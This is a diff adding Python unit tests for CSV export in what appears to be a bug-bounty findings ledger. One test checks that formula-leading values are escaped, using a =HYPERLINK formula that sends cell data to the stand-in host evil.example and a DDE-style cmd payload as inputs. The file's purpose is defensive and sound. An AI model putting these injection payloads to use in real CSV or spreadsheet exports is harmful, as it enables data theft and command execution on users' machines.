@@ -211,6 +211,53 @@ class LedgerTests(unittest.TestCase):
         acme_key = ledger.program_key("acme", "https://a")
         self.assertEqual(whole["programs"][acme_key]["stages"]["confirmed"], 1)
 
+    def test_to_csv_rows_single_program(self) -> None:
+        ledger.upsert_findings(self.rt, "acme", "https://x", [_item("C1", "xss", "r", "https://x/a", proof="confirmed")])
+        ledger.upsert_findings(self.rt, "acme", "https://x", [_item("C2", "ssrf", "r2", "https://x/b", proof="missing")])
+        rows = ledger.to_csv_rows(self.rt, "acme", "https://x")
+        self.assertEqual(len(rows), 2)
+        self.assertEqual({r["class_id"] for r in rows}, {"xss", "ssrf"})
+        for r in rows:
+            self.assertEqual(r["program"], ledger.program_key("acme", "https://x"))
+            self.assertEqual(set(r.keys()), set(ledger.CSV_COLUMNS))
+
+    def test_to_csv_rows_whole_portfolio(self) -> None:
+        ledger.upsert_findings(self.rt, "acme", "https://a", [_item("C1", "xss", "r", "https://a/1", proof="confirmed")])
+        ledger.upsert_findings(self.rt, "beta", "https://b", [_item("C2", "ssrf", "r", "https://b/1", proof="confirmed")])
+        rows = ledger.to_csv_rows(self.rt)
+        self.assertEqual(len(rows), 2)
+        self.assertEqual({r["program"] for r in rows}, {ledger.program_key("acme", "https://a"), ledger.program_key("beta", "https://b")})
+
+    def test_to_csv_rows_empty_store_returns_empty_list(self) -> None:
+        self.assertEqual(ledger.to_csv_rows(self.rt), [])
+        self.assertEqual(ledger.to_csv_rows(self.rt, "never-seen"), [])
+
+    def test_to_csv_rows_defangs_formula_leading_titles(self) -> None:
+        # A hostile target/program could embed target-controlled text as a finding's
+        # title/source_url with no guarantee of a fixed literal prefix. A leading
+        # =/+/-/@ must never reach the CSV cell unescaped -- Excel/Sheets/LibreOffice
+        # would evaluate it as a formula on open.
+        malicious = {
+            "finding": {"ref": "C1", "class_id": "xss", "rule_id": "r",
+                        "location": "https://x/a", "severity": "high",
+                        "title": '=HYPERLINK("http://evil.example/steal?d="&A1,"click")',
+                        "proof_status": "confirmed"},
+            "source_url": "@SUM(1+1)*cmd|' /C calc'!A0",
+            "proof_status": "confirmed", "cvss": {"base_score": 8.0}, "source_json": "",
+        }
+        ledger.upsert_findings(self.rt, "acme", "https://x", [malicious])
+        rows = ledger.to_csv_rows(self.rt, "acme", "https://x")
+        self.assertEqual(len(rows), 1)
+        row = rows[0]
+        self.assertTrue(row["title"].startswith("'="), row["title"])
+        self.assertTrue(row["source_url"].startswith("'@"), row["source_url"])
+
+    def test_to_csv_rows_leaves_benign_fields_untouched(self) -> None:
+        ledger.upsert_findings(self.rt, "acme", "https://x", [_item("C1", "xss", "r", "https://x/a", proof="confirmed")])
+        rows = ledger.to_csv_rows(self.rt, "acme", "https://x")
+        self.assertEqual(rows[0]["title"], "xss at https://x/a")
+        self.assertEqual(rows[0]["source_url"], "https://x/a")
+
     def test_submitted_records_only_lists_submitted_with_report_id(self) -> None:
         confirmed_item = _item("C1", "xss", "r", "https://x/a")
         ledger.upsert_findings(self.rt, "acme", "https://x", [confirmed_item])  # stays 'confirmed', no report id
